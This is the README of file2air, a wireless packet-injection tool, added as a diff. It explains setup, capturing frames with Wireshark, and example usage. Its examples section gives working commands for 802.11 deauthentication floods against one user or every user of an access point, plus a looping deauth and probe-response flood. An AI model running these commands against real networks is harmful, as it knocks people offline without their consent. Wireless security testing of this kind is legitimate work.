@@ -1,0 +1,79 @@
+file2air v1.1 - inject 802.11 packets from binary files <jwright@hasborg.com>
+
+
+ABOUT
+
+file2air uses the LORCON (http://802.11ninja.net) to inject packets into an
+802.11 network, using a binary input file for the transmission information.
+I've included a few sample packets in the ./packets/ directory for testing
+purposes.
+
+file2air will read the binary input file and transmit the contents onto a
+wireless network.  It is assumed the input file is a valid 802.11 packet, with
+an appropriate 802.11 header. Through command line options, the user can
+override the destination, source and BSSID addresses, sequence number and
+other fields with command-line arguments, and can specify the number of
+packets to send with an arbitrary delay between each packet.
+
+
+SETUP
+
+In order to use file2air, you must have LORCON installed on your system,
+with a supported wireless card and driver configuration.  See the LORCON
+website at http://802.11ninja.net for more information.
+
+
+GETTING PACKETS
+
+You can create arbitrary packets with any hex editor, but having a starting
+point is handy.  Using Wireshark, highlight the frame you want to use as
+your starting point, and click on the frame contents.  With the approrpriate
+frame bytes highlighted, click File -> Export -> Selected Packet Bytes and
+save the contents as a file.  Modify this file as needed (if at all) and
+then pass the filename to file2air with the -r argument.
+
+
+EXAMPLES
+
+- DoS a single user with a repeated deauthentication flood:
+
+  ./file2air -i wlan0 -n 65000 -d 00:01:02:03:04:05 -s 00:40:96:01:02:03 \
+             -b 00:40:96:01:02:03 -f ./packets/deauth.bin
+
+  Where 00:01:02:03:04:05 is the victim MAC, and 00:40:96:01:02:03 is the AP
+  they are associated with (err, were associated with).
+
+- DoS all the users on an AP:
+
+  ./file2air -i wlan0 -n 65000 -d ff:ff:ff:ff:ff:ff -s 00:40:96:01:02:03 \
+             -b 00:40:96:01:02:03 -f ./packets/deauth.bin
+
+- Something much more devious:
+
+  /bin/bash -c "while : ; do
+     ./file2air -i wlan0 -n 3 -d ff:ff:ff:ff:ff:ff -s 00:40:96:01:02:03 \
+                -b 00:40:96:01:02:03 -f ./packets/deauth.bin
+     ./file2air -i wlan0 -n 100 -d ff:ff:ff:ff:ff:ff -s 00:40:96:01:02:03 \
+                -b 00:40:96:01:02:03 -f ./packets/proberesp.bin
+  done"
+
+
+CONTACT
+
+Questions, comments, suggestions - jwright@hasborg.com
+
+
+CREDIT WHERE CREDIT IS DUE
+
+My personal thanks for the following people:
+
+  + FX for the original file2wire souce, which much of this work is based on.
+  + Dragorn, for answering my endless questions about C
+
+
+UNINTERESTING NOTE
+
+Much of this code and this README was written while sitting on the sidewalk in
+line for "The Wiggles" tickets.
+
+$Id: README,v 1.4 2005/02/16 13:16:49 jwright Exp $
